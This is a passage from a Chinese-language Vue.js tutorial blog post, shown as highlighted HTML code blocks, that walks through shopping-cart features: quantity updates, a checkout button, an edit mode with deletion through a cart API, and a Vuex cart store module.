#9CDCFE">goodsId</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsNum</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_sku_id</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #DCDCAA">updateCart</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      })</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 打印console提示，显示本地提交同步的参数对象</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><p>给数量框组件添加绑定事件</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">CountBox</span></span><span class="line"><span style="color: #D4D4D4">  @</span><span style="color: #9CDCFE">input</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #DCDCAA">changeCount</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$event</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_sku_id</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">  :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">CountBox</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>给结算按钮添加绑定事件</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goPay"</span></span><span class="line"><span style="color: #D4D4D4">  @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">goPay</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">  :</span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">disabled</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">selectedCartCount</span><span style="color: #D4D4D4"> === </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> }</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">结算({{selectedCartCount}})</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>methods 中提供相对应的方法</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">changeCount</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">obj</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsId:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsNum:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsSkuId:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">goodsSkuId</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart/changeCount'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">goPay</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 先触发购物车与后台数据的同步</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart/syncCartAction'</span><span style="color: #D4D4D4">)</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 触发真正的结算</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><p>真正的结算待做。</p><h3 id="编辑切换状态删除功能"><a class="markdownIt-Anchor" href="#编辑切换状态删除功能"></a> 编辑切换状态，删除功能</h3><p>点击编辑按钮，结算按钮变为删除按钮。</p><p>给购物车页面提供一个数据用于标识是否处于编辑状态</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">isEdit:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">},</span></span></code></pre></div></div></figure><p>并监视其状态</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">watch</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">isEdit</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">val</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">val</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 说明进入编辑状态</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart/allToggle'</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 说明退出编辑状态</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart/allToggle'</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>相对应的对 template 中结算按钮和编辑按钮进行修改</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"edit"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">isEdit</span><span style="color: #D4D4D4"> = !</span><span style="color: #9CDCFE">isEdit</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  &lt;van-icon name="edit" /&gt;</span></span><span class="line"><span style="color: #D4D4D4">  编辑</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;div v-if="!isEdit" class="goPay" @click="goPay" :class="{disabled: selectedCartCount === 0}"&gt;结算({{selectedCartCount}})</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>删除功能待做。</p><h3 id="删除商品"><a class="markdownIt-Anchor" href="#删除商品"></a> 删除商品</h3><p>封装接口模块 <code>api/cart.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 删除购物车商品</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">deleteSelected</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">cartIds</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// cartIds: 要删除的商品id数组</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/cart/clear"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">cartIds</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>vuex 子模块 Cart 提供异步方法</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 删除选中的商品</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">delSelCartA</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 获取选中的商品id然后进行删除</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">ids</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">map</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(ids)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">deleteSelected</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">ids</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'删除成功'</span><span style="color: #D4D4D4">)</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 删除后重新拉取购物车数据</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'getCartAction'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><p>接着修复了一些小 bug：商品详情页初始不显示购物车数量、添加到购物车之后数量不会自动更新、购物车页面编辑状态退出后按钮未恢复到结算按钮。下面是修复后的 <code>store/modules/cart.js</code> 和 <code>views/productdetail.vue</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getCartList</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">updateCart</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">deleteSelected</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">addCart</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/cart"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vant"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">namespaced:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">state</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 提供一个数组用于存储购物车列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">cartList:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">mutations:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 提供方法可以设置购物车列表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setCartList</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">newCartList</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">newCartList</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 修改商品选中状态</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">toggleChecked</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 遍历购物车列表，找到对应id的商品，修改其选中状态</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4"> = !</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 全选和反选</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">allToggle</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">flag</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 遍历购物车列表，修改所有商品的选中状态</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">flag</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 改变商品数量</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">changeCount</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 遍历购物车列表，找到对应id的商品，修改其数量</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">goodsId</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsNum</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsSkuId</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_sku_id</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">goodsNum</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">actions:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 添加商品到购物车</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">addCartAction</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 先判断是否已经存在该商品，如果存在，则只修改商品数量</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">goodsId</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsNum</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsSkuId</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_sku_id</span><span style="color: #D4D4D4"> === </span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: 